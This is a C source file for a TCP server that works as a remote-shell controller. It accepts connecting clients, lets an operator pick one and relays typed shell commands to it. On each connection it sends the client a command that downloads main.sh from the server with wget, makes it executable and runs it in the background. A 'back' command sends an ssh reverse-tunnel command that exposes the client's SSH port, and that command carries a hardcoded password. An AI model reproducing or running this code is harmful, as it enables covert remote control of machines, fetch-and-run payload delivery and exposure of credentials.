#include "exnc_svr.h"

#include <unistd.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

#include "parse.h"


static stExncSvrEnv_t e;

extern const char *global_get_self_ip();

static int exnc_svr_new_cli_init_func(int fd);
static int exnc_svr_util_start_exnc_server(int port);
static int exnc_svr_util_strip_space(char *buf);
static int exnc_svr_util_send_cmd(int fd, char *buf);
static int exnc_svr_util_back(int backport);
static int exnc_svr_add_cli(int fd);
static int exnc_svr_del_cli(int fd);
static int exnc_svr_util_clr_all();
static int exnc_svr_reg_cli(int fd);
static int exnc_svr_sel_cli(int fd);
static int exnc_svr_unsel_cli(int fd);
static int exnc_svr_unreg_cli(int fd);
static char * exnc_svr_get_cli_ip(int fd);
static char * exnc_svr_get_cli_mac(int fd);
static int exnc_svr_set_cli_ip(int fd, char *cliip);
static int exnc_svr_set_cli_mac(int fd, char *climac);

static stCmd_t *cmd_search(const char *cmd);
static void do_cmd_exit(char *argv[], int argc);
static void do_cmd_help(char *argv[], int argc);
static void do_cmd_list(char *argv[], int argc);
static void do_cmd_sele(char *argv[], int argc);
static void do_cmd_back(char *argv[], int argc);

static stCmd_t cmds[] = {
	{"exit", do_cmd_exit, "exit the programe!"},
	{"help", do_cmd_help, "help info"},
	{"list", do_cmd_list, "list all connectted devices"},
	{"sel", do_cmd_sele, "select a target"},
	{"back", do_cmd_back, "do remote back"},

	/*
	{"include", do_cmd_include, "include a zwave device"},
	{"exclude", do_cmd_exclude, "exclude a zwave device : exclude <mac>"},
	{"onoff", do_cmd_switch_onoff, "onoff binary switch: onoff <mac> <onoff>"},
	{"info", do_cmd_info, "get zwave network info"},
	{"test", do_cmd_test, "test ..."},
	{"viewall", do_cmd_viewall, "view all zwave devices"},
	{"remove", do_cmd_remove, "remove failed node id"},
	{"version", do_cmd_version, "display version"},
	*/
};




int exnc_svr_init(void *_th, void *_fet) {
	e.th = _th;
	e.fet = _fet;
	
	timer_init(&e.tr, exnc_svr_run);
	lockqueue_init(&e.eq);

	/**> init and register server socket */	
	e.svr_fd = exnc_svr_util_start_exnc_server(3234);
	if (e.svr_fd < 0) {
		log_warn("Can't Create Server Tcp Server at port %d", 3234);
		return -1;
	}
	file_event_reg(e.fet, e.svr_fd, exnc_svr_in, NULL, NULL);

	/**> register stdin fd */
	file_event_reg(e.fet, 0, exnc_svr_cmd_in, NULL, NULL);

	/**> zero the cli_fds */
	memset(e.clis, 0, sizeof(e.clis));

	e.sel_fd = 0;

	return 0;
}

int exnc_svr_push() {
	return 0;
}
int exnc_svr_step() {
	return 0;
}

void exnc_svr_in(void *arg, int fd) {
	int clifd = tcp_accept(fd, 4, 80);
	if (clifd <= 0) {
		log_warn("server accept < 0(%d) result", clifd);
		return;
	}
	char cliip[32];
	char climac[32];

	struct sockaddr_in addr_conn;
	socklen_t nSize = sizeof(addr_conn);
	getpeername(clifd,(struct sockaddr*)&addr_conn, &nSize);
	char szPeerAddress[16];
	memset((void *)szPeerAddress,0,sizeof(szPeerAddress));	
	strcpy(szPeerAddress,inet_ntoa(addr_conn.sin_addr));
	strcpy(cliip, szPeerAddress);

	log_info("Add Client [%s@%s]->%d", cliip, climac, clifd);
	exnc_svr_add_cli(clifd);
	exnc_svr_new_cli_init_func(clifd);
	exnc_svr_set_cli_ip(clifd, cliip);
	exnc_svr_set_cli_mac(clifd, climac);
	exnc_svr_reg_cli(clifd);
}
void exnc_cli_in(void *arg, int fd) {
	char buf[4096*2];
	int ret = tcp_recv(fd, buf, sizeof(buf), 1, 80);
	if (ret == 0) {
		return;
	}
	const char *cliip		= exnc_svr_get_cli_ip(fd);
	const char *climac	= exnc_svr_get_cli_mac(fd);
	if (ret < 0) {
		log_info("Del Client [%s@%s]->%d", cliip, climac, fd);
		exnc_svr_unsel_cli(fd);
		exnc_svr_unreg_cli(fd);
		exnc_svr_del_cli(fd);
		return;
	}
	buf[ret] = 0;
	exnc_svr_util_strip_space(buf);

	if (e.sel_fd == 0) {
		return;
	}
	if (e.sel_fd != fd) {
		return;
	}

	//printf("[%s@%s]: %s\n", cliip, climac, buf);
	printf("\n%s", buf);
}
void exnc_svr_cmd_in(void *arg, int fd) {
	char buf[4096*2];

	int ret = read(fd, buf, sizeof(buf));
	if (ret < 0) {
		log_warn("what happend?");
		return;
	}

	if (ret == 0) {
		log_err("error!");
		return;
	}

	int size = ret;
	buf[size] = 0;
	if (buf[size-1] == '\n') {
		buf[size-1] = 0;
		size--;
	}
	char *p = buf;
	while (*p == ' ') {
		p++;
		size--;
	}
	if (size > 0) {
		memcpy(buf, p, size);
	} else {
		buf[0] = 0;
		size = 0;
	}

	if (strcmp(buf, "") == 0) {
		return;
	}


	if (e.sel_fd == 0) {
		log_debug("console input:[%s]", buf);
		char* argv[20];
		int argc;
		argc = parse_argv(argv, sizeof(argv), buf);

		stCmd_t *cmd = cmd_search(argv[0]);
		if (cmd == NULL) {
			log_debug("invalid cmd!");
		} else {
			cmd->func(argv, argc);
		}

		//log_info("$");
		printf("$");
	} else {
		if (strcmp(buf, "exit") == 0) {
			exnc_svr_unsel_cli(e.sel_fd);
			log_info("$");
			return;
		} else if (strcmp(buf, "back") == 0) {
			char* argv[20];
			int argc;
			argc = parse_argv(argv, sizeof(argv), buf);
			int backport = 2200;
			if (argc != 2) {		
				backport = 2200;
			} else {
				backport = atoi(argv[1]);
			}
			if (backport < 0) {
				backport = 2200;
			}
			exnc_svr_util_back(backport);
		} else {
			strcat(buf, "\n");
			exnc_svr_util_send_cmd(e.sel_fd, buf);
		}
	}
}

void exnc_svr_run(struct timer *timer) {
	/**> TODO */
}

int exnc_svr_ctrl_c() {
#if 0
	if (e.sel_fd == 0) {
		return 0;
	}

	log_info("Send Ctrl + C");
	//exnc_svr_util_send_cmd(e.sel_fd, "\x03");
	//exnc_svr_util_send_cmd(e.sel_fd, "^C");
#else
	exnc_svr_util_clr_all();
#endif
	return 0;
}

////////////////////////////////////////////////////////////////
static int exnc_svr_util_start_exnc_server(int port) {
	int ret = tcp_create(TCP_SERVER, "0.0.0.0", 3234);
	if (ret < 0) {
		return ret;
	}
	return ret;
}
static int exnc_svr_util_strip_space(char *buf) {
	int len = strlen(buf);
	if (buf[len-1] == '\r' || buf[len - 1] == '\n') {
		buf[len-1] = 0;
		return 0;
	}
	return 0;
}
static int exnc_svr_util_send_cmd(int fd, char *buf) {
	int len = strlen(buf);
	int ret = tcp_send(fd, buf, len, 4, 80);
	if (ret < 0) {
		log_warn("Send Cli Command Error, Del Cli");
		exnc_svr_unsel_cli(fd);
		exnc_svr_unreg_cli(fd);
		exnc_svr_del_cli(fd);
	}
	return 0;
}
static int exnc_svr_util_back(int backport) {
	if (e.sel_fd <= 0) {
		return 0;
	}

	char cmd[256];
	sprintf(cmd, "remote -p dyxDusun168 ssh -p 22 -y -g -N -R 0.0.0.0:%d:127.0.0.1:22 dyx@%s > /dev/null &", backport, global_get_self_ip());
	log_info("Back Cmd:%s", cmd);
	exnc_svr_util_send_cmd(e.sel_fd, cmd);
	return 0;
}


static int exnc_svr_add_cli(int fd) {
	int i = 0;
	int cnt = sizeof(e.clis)/sizeof(e.clis[0]);
	for (i = 0; i < cnt; i++) {
		stCli_t *cli = &e.clis[i];
		if (cli->fd > 0) {
			continue;
		}
		log_info("Add cli %d ok", fd);
		cli->fd = fd;
		return 0;
	}
	return -1;
}
static int exnc_svr_del_cli(int fd) {
	if (fd <= 0) {
		return 0;
	}
	
	int i = 0;
	int cnt = sizeof(e.clis)/sizeof(e.clis[0]);
	for (i = 0; i < cnt; i++) {
		stCli_t *cli = &e.clis[i];
		if (cli->fd <= 0) {
			continue;
		}

		if (cli->fd != fd) {
			continue;
		}	

		log_info("Del cli %d ok", fd);
		cli->fd = 0;
		return 0;
	}
	
	return -1;
}
static int exnc_svr_util_clr_all() {
	exnc_svr_unsel_cli(e.sel_fd);

	int i = 0;
	int cnt = sizeof(e.clis)/sizeof(e.clis[0]);
	for (i = 0; i < cnt; i++) {
		stCli_t *cli = &e.clis[i];
		if (cli->fd <= 0) {
			continue;
		}

		log_info("killall ssh for %s", cli->ip);
		exnc_svr_util_send_cmd(cli->fd, "killall ssh\n");
		usleep(300000);
		exnc_svr_unreg_cli(cli->fd);
		tcp_destroy(cli->fd);
		log_info("Del cli %d ok", cli->fd);
		cli->fd = 0;
	}

	return 0;	
}
static int exnc_svr_reg_cli(int fd) {
	file_event_reg(e.fet, fd, exnc_cli_in, NULL, NULL);
	return 0;
}
static int exnc_svr_unreg_cli(int fd) {
	file_event_unreg(e.fet, fd, exnc_cli_in, NULL, NULL);
	return 0;
}
static char * exnc_svr_get_cli_ip(int fd) {
	if (fd <= 0) {
		return "0.0.0.0";
	}
	
	int i = 0;
	int cnt = sizeof(e.clis)/sizeof(e.clis[0]);
	for (i = 0; i < cnt; i++) {
		stCli_t *cli = &e.clis[i];
		if (cli->fd <= 0) {
			continue;
		}

		if (cli->fd != fd) {
			continue;
		}	

		return cli->ip;
	}
	
	return "0.0.0.0";
}
static char * exnc_svr_get_cli_mac(int fd) {
	if (fd <= 0) {
		return "00:00:00:00:00:00";
	}
	
	int i = 0;
	int cnt = sizeof(e.clis)/sizeof(e.clis[0]);
	for (i = 0; i < cnt; i++) {
		stCli_t *cli = &e.clis[i];
		if (cli->fd <= 0) {
			continue;
		}

		if (cli->fd != fd) {
			continue;
		}	

		return cli->mac;
	}
	
	return "00:00:00:00:00:00";
}
static int exnc_svr_set_cli_ip(int fd, char *cliip) {
	if (fd <= 0) {
		return 0;
	}
	
	int i = 0;
	int cnt = sizeof(e.clis)/sizeof(e.clis[0]);
	for (i = 0; i < cnt; i++) {
		stCli_t *cli = &e.clis[i];
		if (cli->fd <= 0) {
			continue;
		}

		if (cli->fd != fd) {
			continue;
		}	

		log_info("set %d ip to [%s]", fd, cliip);
		strcpy(cli->ip, cliip);
		return 0;
	}
	
	return -1;
}
static int exnc_svr_set_cli_mac(int fd, char *climac) {
	if (fd <= 0) {
		return 0;
	}
	
	int i = 0;
	int cnt = sizeof(e.clis)/sizeof(e.clis[0]);
	for (i = 0; i < cnt; i++) {
		stCli_t *cli = &e.clis[i];
		if (cli->fd <= 0) {
			continue;
		}

		if (cli->fd != fd) {
			continue;
		}	

		log_info("set %d mac to [%s]", fd, climac);
		strcpy(cli->mac, climac);
		return 0;
	}
	
	return -1;
}
static int exnc_svr_sel_cli(int fd) {
	int i = 0;
	int cnt = sizeof(e.clis)/sizeof(e.clis[0]);
	for (i = 0; i < cnt; i++) {
		stCli_t *cli = &e.clis[i];
		if (cli->fd <= 0) {
			continue;
		}

		if (cli->fd == fd) {
			e.sel_fd = fd;
			return 0;
		}
	}

	return -1;
}
static int exnc_svr_unsel_cli(int fd) {
	int i = 0;
	int cnt = sizeof(e.clis)/sizeof(e.clis[0]);
	for (i = 0; i < cnt; i++) {
		stCli_t *cli = &e.clis[i];
		if (cli->fd <= 0) {
			continue;
		}

		if (cli->fd == fd) {
			e.sel_fd = 0;
			return 0;
		}
	}

	return -1;
}


stCmd_t *cmd_search(const char *cmd) {
	int i = 0;
	for (i = 0; i < sizeof(cmds)/sizeof(cmds[0]); i++) {
		if (strcmp(cmds[i].name, cmd) == 0) {
			return &cmds[i];
		}
	}
	return NULL;
}


void do_cmd_exit(char *argv[], int argc) {
	exit(0);
}

void do_cmd_help(char *argv[], int argc) {
	int i = 0;
	log_info("current select: %d", e.sel_fd);
	for (i = 0; i < sizeof(cmds)/sizeof(cmds[0]); i++) {
		log_info("%-12s\t-\t%s", cmds[i].name, cmds[i].desc);
	}
}

void do_cmd_list(char *argv[], int argc) {
	int i = 0;
	int cnt = sizeof(e.clis)/sizeof(e.clis[0]);
	for (i = 0; i < cnt; i++) {
		stCli_t *cli = &e.clis[i];
		if (cli->fd <= 0) {
			continue;
		}

		char *ip = exnc_svr_get_cli_ip(cli->fd);
		char *mac = exnc_svr_get_cli_mac(cli->fd);
		log_info("fd:%d, ip:%s, mac:%s", cli->fd, ip, mac);
	}
}

static void do_cmd_sele(char *argv[], int argc) {
	if (argc != 2) {
		log_warn("argment error: sele <selelect fd>");
		return;
	}

	int fd = atoi(argv[1]);
	if (fd <= 0) {
		log_warn("argment error: error select fd");
		return;
	}

	int ret = exnc_svr_sel_cli(fd);
	if (ret != 0) {
		log_warn("argment error: not exsist fd");
	}
}
static void do_cmd_back(char *argv[], int argc) {
	
}

//////////////////////////////////////////////////////////////////
static int exnc_svr_new_cli_init_func(int fd) {
	log_info("exnc execute remote client init function:");
	char buf[1024];
	sprintf(buf, "rm -rf /tmp/main.sh; wget http://%s:8383/dl/main.sh -P /tmp; chmod 777 /tmp/main.sh; /tmp/main.sh 2>1 1>/dev/null &\n", global_get_self_ip());
	log_info("%s", buf);
	exnc_svr_util_send_cmd(fd, buf);
	return 0;
}
